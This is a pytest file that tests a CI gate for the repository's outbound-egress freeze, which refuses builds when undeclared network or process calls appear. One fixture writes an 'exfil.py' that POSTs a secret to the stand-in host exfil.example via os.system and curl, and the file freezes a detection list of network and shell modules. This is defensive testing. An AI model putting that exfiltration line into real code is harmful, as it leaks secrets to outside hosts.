"""The GATE of the egress-sites freeze -- the 6 lines that decide the REFUSAL.

**THIS FILE WAS BORN FROM AN ISOLATED AUDIT THAT FOUND `sites_run.py` COVERED BY NOTHING.**
`grep -rn "sites_run" tests/` returned **zero**. Three mutations survived the judge's 19 tests:
the gate that never refuses anymore, the zero-site case turned green, and `parents[4]` put back
to `parents[3]` -- *literally the bug the original commit celebrated having caught by hand.*

**The lesson, engraved here because it goes beyond this file**: tests that question the JUDGE
(pure data) and the EDGE (the census) can all be green while **the line that turns a verdict into
a refusal** is read by nobody. *The rc is a surface in its own right.*

TODO(public-mirror): several assertions below check the exact wording `resume()` prints (e.g.
"all declared", "NOT DECLARED", "NO SITE", "NOT MEASURED", and the docstring-count regex near the
bottom). That wording is produced by `production/sites_de_sortie.py`, translated as part of a
different lot of this same sync — verify the two agree once both files are synced, and reconcile
either side if the exact phrasing drifted.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from mnemosyne.production import sites_de_sortie as sites_de_sortie_module
from mnemosyne.production.sites_de_sortie import (
    APPELS_DE_SORTIE,
    RACINES_DE_SORTIE,
    SITES_GELES,
    Verdict,
    recenser,
    resume,
)
from mnemosyne.runtime.sites_run import RACINE, main


def _arbre(tmp_path: Path, fichiers: dict[str, str]) -> Path:
    """A fake repository: `<racine>/system/lib/...`, the exact shape `main` traverses."""
    for nom, corps in fichiers.items():
        f = tmp_path / "system" / "lib" / nom
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_text(corps, encoding="utf-8")
    return tmp_path


# --------------------------------------------------------------------------------------------
# THE RC -- the three outcomes, and there are THREE of them
# --------------------------------------------------------------------------------------------


def test_la_porte_rend_ZERO_quand_le_gel_TIENT(tmp_path, capsys):
    r = _arbre(tmp_path, {"a.py": "import subprocess\n"})
    assert main(racine=r, geles={"a.py::subprocess"}) == 0
    assert "all declared" in capsys.readouterr().out


def test_la_porte_REFUSE_sur_un_site_APPARU(tmp_path, capsys):
    """Mutation `return 0 if v.tient else 1` -> `return 0`: SURVIVED before this test."""
    r = _arbre(tmp_path, {"a.py": "import subprocess\nimport requests\n"})
    assert main(racine=r, geles={"a.py::subprocess"}) == 1
    assert "NOT DECLARED" in capsys.readouterr().out


def test_la_porte_REFUSE_sur_une_declaration_DISPARUE(tmp_path, capsys):
    """The other half of the two-way difference: a freeze entry that remains AFTER its site is removed."""
    r = _arbre(tmp_path, {"a.py": "import subprocess\n"})
    assert main(racine=r, geles={"a.py::subprocess", "parti.py::requests"}) == 1
    assert "NO SITE" in capsys.readouterr().out


def test_la_porte_rend_DEUX_quand_elle_n_a_RIEN_pu_mesurer(tmp_path, capsys):
    """Mutation `return 2` -> `return 0`: SURVIVED before this test.

    An empty tree is not a clean repository: it is a broken instrument. Distinguishing it from
    a pass is this code's whole reason for existing -- *two absences of measurement compare equal*."""
    r = _arbre(tmp_path, {})
    (r / "system" / "lib").mkdir(parents=True, exist_ok=True)
    assert main(racine=r, geles=SITES_GELES) == 2
    assert "NOT MEASURED" in capsys.readouterr().out


def test_les_trois_issues_sont_DEUX_A_DEUX_distinctes():
    """An rc that collapses onto another makes the gate mute without any test above turning red."""
    assert len({0, 1, 2}) == 3


# --------------------------------------------------------------------------------------------
# THE PRODUCTION VALUE -- injected everywhere above, so judged HERE and nowhere else
# --------------------------------------------------------------------------------------------


def test_la_RACINE_de_production_designe_le_DEPOT(tmp_path):
    """Mutation `parents[4]` -> `parents[3]`: SURVIVED before this test.

    *Testing a gate by injecting its population does not test the production population.* The rc
    tests all pass a test `racine`; this one is the only one that reads `RACINE`."""
    assert (RACINE / "system" / "lib" / "mnemosyne").is_dir()
    assert (RACINE / "Makefile").is_file()
    assert (RACINE / "CLAUDE.md").is_file()


def test_la_RACINE_de_production_donne_un_recensement_NON_VIDE():
    """`parents[3]` breaks none of the path assertions above if `system/` exists --
    what matters is that the root RETURNS sites."""
    assert len(recenser(RACINE / "system" / "lib")) > 20


# --------------------------------------------------------------------------------------------
# THE PUBLISHED TEXT -- the original tests read the verdict's DATA, never the MESSAGE
# --------------------------------------------------------------------------------------------


def test_le_resume_NOMME_les_apparus():
    v = Verdict(apparus=("x.py::requests",), disparus=(), compares=3)
    assert "x.py::requests" in resume(v)


def test_le_resume_NOMME_les_disparus(tmp_path):
    """Mutation: branch `if v.disparus:` neutralized -> SURVIVED before this test.

 The sentence could become ` egress sites (27 compared) — .` without any test turning red."""
    v = Verdict(apparus=(), disparus=("parti.py::socket",), compares=3)
    sortie = resume(v)
    assert "parti.py::socket" in sortie
    assert "NO SITE" in sortie


def test_le_resume_publie_les_DEUX_moities_a_la_fois():
    v = Verdict(apparus=("neuf.py::httpx",), disparus=("parti.py::socket",), compares=9)
    sortie = resume(v)
    assert "neuf.py::httpx" in sortie and "parti.py::socket" in sortie


def test_le_resume_dit_toujours_sur_combien_il_a_juge():
    assert "9" in resume(Verdict(apparus=("a::b",), disparus=(), compares=9))


# --------------------------------------------------------------------------------------------
# THE FLOOR -- frozen by SET. The original test kept 6 out of 18.
# --------------------------------------------------------------------------------------------


def test_les_racines_de_sortie_sont_gelees_par_ENSEMBLE():
    """Mutation: 11 roots removed at once -> SURVIVED before this test.

    The old version kept a SAMPLE of 6 names: `smtplib` (email), `paramiko` (SSH) and `ssl`
    could disappear silently. *We freeze the SET, never a sample or a count.*"""
    assert RACINES_DE_SORTIE == frozenset(
        {
            "aiohttp",
            "anthropic",
            "asyncio",
            "boto3",
            "ctypes",
            "ftplib",
            "grpc",
            "http",
            "httpcore",
            "httpx",
            "imaplib",
            "multiprocessing",
            "openai",
            "paramiko",
            "pexpect",
            "poplib",
            "psycopg",
            "psycopg2",
            "pty",
            "pycurl",
            "pymongo",
            "qdrant_client",
            "redis",
            "requests",
            "smtplib",
            "socket",
            "socketserver",
            "ssl",
            "subprocess",
            "telnetlib",
            "urllib",
            "urllib3",
            "webbrowser",
            "websocket",
            "websockets",
            "xmlrpc",
            "zmq",
        }
    )


def test_les_appels_de_sortie_sont_geles_par_ENSEMBLE():
    assert ("os", "system") in APPELS_DE_SORTIE
    assert ("os", "popen") in APPELS_DE_SORTIE
    assert ("os", "fork") in APPELS_DE_SORTIE
    assert len(APPELS_DE_SORTIE) == 19


# --------------------------------------------------------------------------------------------
# THE CAPITAL DEFECT -- the exfiltration v1 let through at rc=0, now a test
# --------------------------------------------------------------------------------------------


def test_les_QUATRE_sorties_vers_un_TIERS_sont_vues(tmp_path):
    """v1 counted ZERO of these. These are exactly the exits invariant 5 names FIRST
    ("external / MODEL") and that `CLAUDE.md` calls a third-party cloud."""
    r = _arbre(
        tmp_path,
        {
            "m.py": (
                "def f():\n"
                "    from anthropic import Anthropic\n"
                "    from openai import OpenAI\n"
                "    from qdrant_client import QdrantClient\n"
            )
        },
    )
    vus = {s.module for s in recenser(r / "system" / "lib")}
    assert vus == {"anthropic", "openai", "qdrant_client"}


def test_les_clients_de_modele_du_DEPOT_REEL_sont_dans_le_gel():
    """The case above is a fixture; this one reads production."""
    cles = {s.cle() for s in recenser(RACINE / "system" / "lib")}
    for attendu in (
        "mnemosyne/ingest/caption_anthropic.py::anthropic",
        "mnemosyne/runtime/runner_anthropic.py::anthropic",
        "mnemosyne/runtime/runner_openai.py::openai",
        "mnemosyne/stores/vector_qdrant.py::qdrant_client",
    ):
        assert attendu in cles, f"{attendu} became invisible again"
        assert attendu in SITES_GELES, f"{attendu} seen but not declared"


def test_une_EXFILTRATION_par_os_system_fait_REFUSER_la_porte(tmp_path, capsys):
    """THE EXACT SCENARIO FROM THE ISOLATED AUDIT, which produced `rc=0` and a silent tick.

    `os` is imported by 46 files: declaring it at the ROOT level would drown the signal under 46
    noisy sites. The right grain is the ATTRIBUTE CALLED -- zero noise today, immediate bite."""
    r = _arbre(
        tmp_path,
        {
            "exfil.py": (
                "import os\n"
                "def exfiltrer(secret):\n"
                "    os.system(f\"curl -X POST https://exfil.example/ -d '{secret}'\")\n"
            )
        },
    )
    assert main(racine=r, geles=set()) == 1
    assert "os.system()" in capsys.readouterr().out


def test_un_os_INOFFENSIF_ne_fait_PAS_rougir(tmp_path):
    """The counter-proof: without it, this test would only measure my ability to refuse everything.
    46 files import `os` here -- if the grain were the MODULE, this test would fail."""
    r = _arbre(
        tmp_path, {"sage.py": "import os\np = os.path.join('a', 'b')\nos.environ.get('X')\n"}
    )
    assert recenser(r / "system" / "lib") == ()


def test_from_os_import_system_est_vu_AUSSI(tmp_path):
    """The obvious evasion of the by-attribute grain: importing the function instead of the module."""
    r = _arbre(tmp_path, {"e.py": "from os import system\nsystem('curl x')\n"})
    assert {s.module for s in recenser(r / "system" / "lib")} == {"os.system()"}


def test_un_os_system_seulement_LIE_est_vu(tmp_path):
    """`f = os.system` comes out exactly the same, with no `Call` appearing at the site."""
    r = _arbre(tmp_path, {"l.py": "import os\nf = os.system\n"})
    assert {s.module for s in recenser(r / "system" / "lib")} == {"os.system()"}


@pytest.mark.parametrize("module", ["smtplib", "paramiko", "ssl", "anthropic", "openai"])
def test_chaque_racine_SENSIBLE_fait_effectivement_rougir(tmp_path, module):
    """*A declared root that nothing exercises is a declaration, not a barrier.*"""
    r = _arbre(tmp_path, {f"{module}_use.py": f"import {module}\n"})
    assert main(racine=r, geles=set()) == 1


def test_le_COMPTE_ECRIT_dans_la_docstring_dit_vrai() -> None:
    """It LIED: "35 sites" was written while `len(SITES_GELES)` was **38**.

    Measured by an isolated audit, with the reason it survived: `grep -rn "len(SITES_GELES)" tests/`
    returned **zero**. *A figure copied into prose needs a gate, even — especially — when it is
    written three lines from the code it describes.* This is the `P6` remedy from the same harvest,
    applied to the `G1` remedy.

    The figure is RE-READ from the file, never recomputed from `SITES_GELES`: comparing it to
    itself would always pass."""
    import re
    from pathlib import Path

    source = Path(sites_de_sortie_module.__file__).read_text(encoding="utf-8")
    # Aligned 2026-09-09 on the literal wording of the translated docstring in
    # production/sites_de_sortie.py:134 ("THE FROZEN SET OF OUTBOUND SITES, AS OF ... — 38 sites").
    # If that lot re-words it again, this pattern must follow: production is the reference.
    ecrits = re.findall(r"OUTBOUND SITES, AS OF \d{4}-\d{2}-\d{2} — (\d+) sites", source)

    assert len(ecrits) == 1, f"the count must be written ONCE, seen {len(ecrits)} times"
    assert int(ecrits[0]) == len(SITES_GELES), (
        f"the docstring announces {ecrits[0]} sites, the freeze contains {len(SITES_GELES)}"
    )
